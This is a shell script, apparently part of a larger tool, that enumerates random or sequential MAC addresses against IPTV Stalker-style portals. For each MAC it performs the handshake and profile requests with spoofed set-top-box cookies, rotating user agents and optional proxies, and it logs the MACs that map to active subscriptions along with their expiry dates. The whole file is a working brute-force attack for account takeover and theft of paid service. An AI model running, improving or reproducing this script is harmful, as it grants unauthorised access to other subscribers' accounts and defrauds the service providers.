#!/bin/sh

generate_mac() {
	if [[ -n ${read_from_file} ]]; then
		read_mac_from_file
	else
		[[ -n ${seq} ]] && seq_mac
		[[ -z ${seq+x} ]] && random_mac
	fi
}

last_request_was_a_timeout() {
	unset last_request_timedout
	if [[ -n "${proxy_from_file}" ]]; then
		update_proxy
	fi
}

check_if_time_to_stop() {
	if [[ -n ${stopping} && $item -eq $stopping ]]; then
		if ! [[ -n ${only_outputs_mac} ]]; then
			echo "${_BOLD}${_CYAN}$valid_macs_number valid out of $item MACs.${_RESET}"
		fi
		exit 0
	fi
}

check_if_timebreak() {
	if [[ ${timebreak} -ne 0 && $(expr $(( $item )) % $timebreak ) == 0 ]]; then
		if [[ -z ${only_outputs_mac+x} ]]; then
			echo -ne ${_BLUE}"\r[$item] $mac ${_RESET}${_DIM}${_CYAN}--- Pausing for $timebreak_duration seconds..."${_RESET}
		fi
		sleep $timebreak_duration
	else
		sleep $request_delay
	fi
}

request_is_a_timeout() {
	timeout_number=$(( $timeout_number + 1 ))
	last_request_timedout=true
	if ! [[ -n ${only_outputs_mac} ]]; then
		echo -ne "${_ERASE}${_BLUE}Timeout [$timeout_number]. New attempt in $timebreak_duration seconds.${_RESET}"
	fi
	sleep $timebreak_duration
	if ! [[ -n ${only_outputs_mac} ]]; then
		echo -ne "${_ERASE}${_ERASE}${_BLUE}New attempt...${_RESET}"
	fi
}

handshake_token_is_empty() {
	if [[ $handshake_token = "" || $(echo $handshake_token | grep null) ]]; then
		if ! [[ -n ${only_outputs_mac} ]]; then
			echo -ne "${_ERASE}$@${_YELLOW}[$item]${_RESET} ${_RED}$mac ${_RESET}"
		fi
		return 0
	fi
	return 1
}

#profile_is_empty() {
#}

handshaking() {
	if [[ -n ${last_request_timedout} ]]; then
		last_request_was_a_timeout
	else
		if ! [[ $item == 0 ]]; then
			check_if_time_to_stop
			check_if_timebreak
		fi
		item=$(( $item + 1 ))
		generate_mac
	fi
	handshake_url=$(echo $dns)'/portal.php?action=handshake&type=stb&token=&mac='$(echo $encoded_mac)
	cookie="mac=$mac; stb_lang=en; timezone=Europe/Amsterdam; "
	random_user_agent

	handshake_token=$(curl $proxy_user_option $proxy_url_option --max-time $timeout -s -X GET -H "Accept: */*" -H "User-Agent: $(echo $user_agent)" -H "Cookie: $(echo $cookie)" "$(echo $handshake_url)"); if [ $? -eq 28 ]; then request_is_a_timeout && return; fi

	if [[ -n ${debug} ]]; then
		echo -e "\n---------------------------------\n\t${_YELLOW}Handshake token : ${_RESET}${_BLUE}${handshake_token:-Empty}${_RESET}"
	fi

	handshake_token=$(echo $handshake_token| grep -o '"token".*' | sed 's/\"token\":// ; s/\}\}//')

	if handshake_token_is_empty; then
		return
	fi

	authorization='Bearer '$(echo $handshake_token)
	profile_url=$(echo $dns)'/portal.php?type=account_info&action=get_main_info&mac='$(echo $mac)
	profile=$(curl $proxy_user_option $proxy_url_option --max-time $timeout -s -X GET -H "Accept: */*" -H "User-Agent: $(echo $user_agent)" -H "Authorization: $(echo $authorization)" -H "Cookie: $(echo $cookie)" "$(echo $profile_url)"); if [ $? -eq 28 ]; then request_is_a_timeout && return; fi

	if [[ $profile == "" ]]; then
		maybeGEN1portal=true
		profile_url=$(echo $dns)'/portal.php?type=stb&action=get_profile&JsHttpRequest=1-xml='$(echo $mac)
		profile=$(curl $proxy_user_option $proxy_url_option --max-time $timeout -s -X GET -H "Accept: */*" -H "User-Agent: $(echo $user_agent)" -H "Authorization: $(echo $authorization)" -H "Cookie: $(echo $cookie)" "$(echo $profile_url)"); if [ $? -eq 28 ]; then request_is_a_timeout && return; fi
	fi

	if [[ $profile == "" ]]; then
		unset maybeGEN1portal
		if ! [[ -n ${only_outputs_mac} ]]; then
			echo -ne "${_ERASE}$@${_YELLOW}[$item]${_RESET} ${_RED}$mac ${_RESET}"
		fi
		return # test
	fi

	if [[ -z ${maybeGEN1portal+x} ]]; then
		account_url=$(echo $dns)'/portal.php?type=account_info&action=get_main_info&mac='$(echo $mac)
		account=$(curl $proxy_user_option $proxy_url_option --max-time $timeout -s -X GET -H "Accept: */*" -H "User-Agent: $(echo $user_agent)" -H "Authorization: $(echo $authorization)" -H "Cookie: $(echo $cookie)" "$(echo $account_url)"); if [ $? -eq 28 ]; then request_is_a_timeout && return; fi
		if ! [[ $account == "" ]]; then
			if [[ -n ${debug} ]]; then
				echo -e "${_YELLOW}ACCOUNT : ${_RESET}${_BLUE}${account}${_RESET}"
				echo -e "${_YELLOW}PROFILE1 : ${_RESET}${_BLUE}${profile}${_RESET}"
			fi
			profile=$account
		fi
	fi

	if [[ -n ${debug} ]]; then
		echo -e "${_YELLOW}PROFILE2 : ${_RESET}${_BLUE}${profile}${_RESET}"
	fi

	expiration_date=$(echo $profile | grep -o "\"phone\":\".*\"" | sed 's/\"phone\":\"//' | sed 's/\".*//')

	if [[ -n ${debug} ]]; then
		echo -e "${_YELLOW}EXP_DATE : ${_RESET}${_BLUE}${expiration_date}${_RESET}"
	fi

	if [[ -z ${expiration_date} && -z ${keep_expired+x} ]]; then
		if ! [[ -n ${only_outputs_mac} ]]; then
			echo -ne "\r${_YELLOW}[$item]${_RESET} ${_BOLD}${_RED}$mac [expired] ${_RESET}"
		fi
		return
	fi

	if [[ -z ${expiration_date} && -n ${keep_expired} ]]; then
		if ! [[ -n ${only_outputs_mac} ]]; then
			echo -ne "\r${_YELLOW}[$item]${_RESET} ${_BOLD}${_RED}$mac [expired] ${_RESET}\n"
		fi
		if [[ $valid_macs_number == 0 ]]; then
			echo -e "\n$dns ($(date))\n" >> $destination/valid_macs_$name
		fi
		echo "$mac [expired]" >> $destination/valid_macs_$name
		return
	fi

	if [[ $valid_macs_number == 0 ]]; then
		echo -e "\n$dns ($(date))\n" >> $destination/valid_macs_$name
	fi
	echo "$mac [$expiration_date]" >> $destination/valid_macs_$name
	if [[ -n ${only_outputs_mac} ]]; then
		echo $mac
	else
		echo -ne "\r${_BOLD}${_GREEN}[$item] $mac ${_RESET}${_RED}[$expiration_date] ${_RESET}\n"
	fi
	valid_macs_number=$(( $valid_macs_number + 1 ))
	unset maybeGEN1portal
}
